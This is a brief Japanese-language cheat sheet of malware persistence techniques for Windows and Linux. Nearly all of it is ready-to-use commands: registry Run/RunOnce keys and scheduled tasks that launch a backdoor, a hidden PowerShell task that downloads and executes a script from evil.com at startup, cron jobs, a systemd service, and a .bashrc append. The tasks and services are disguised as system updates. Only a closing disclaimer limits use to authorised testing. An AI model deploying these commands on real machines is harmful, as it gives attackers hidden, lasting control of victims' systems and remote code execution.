# Persistence Techniques

## Windows 永続化

### レジストリ自動実行
```powershell
# Run キーの追加
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "backdoor" /t REG_SZ /F /D "C:\path\to\backdoor.exe"

# RunOnce キーの追加
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /V "backdoor" /t REG_SZ /F /D "C:\path\to\backdoor.exe"
```

### スケジュールタスク
```powershell
# 新規タスクの作成
schtasks /create /tn "UpdateTask" /tr "C:\path\to\backdoor.exe" /sc daily /st 09:00

# PowerShell を使用したタスク作成
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NonI -Window Hidden -c 'IEX (New-Object Net.WebClient).DownloadString(''http://evil.com/script.ps1'')'"
$Trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "SystemUpdate" -Description "System Update Task"
```

## Linux 永続化

### Cron ジョブ
```bash
# ルートクーロンに追加
echo "* * * * * /path/to/backdoor" > /etc/cron.d/update-job

# ユーザークーロンに追加
(crontab -l 2>/dev/null; echo "* * * * * /path/to/backdoor") | crontab -
```

### システムサービス
```bash
# システムサービスの作成
cat << EOF > /etc/systemd/system/update-service.service
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/path/to/backdoor
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable update-service
systemctl start update-service
```

### .bashrc / .profile の改変
```bash
echo "nohup /path/to/backdoor &" >> ~/.bashrc
```

## 注意事項
- これらの永続化技術は、許可された環境でのテストにのみ使用してください
- システムの重要な機能に影響を与える可能性があります
- 実環境での使用は違法となる可能性があります 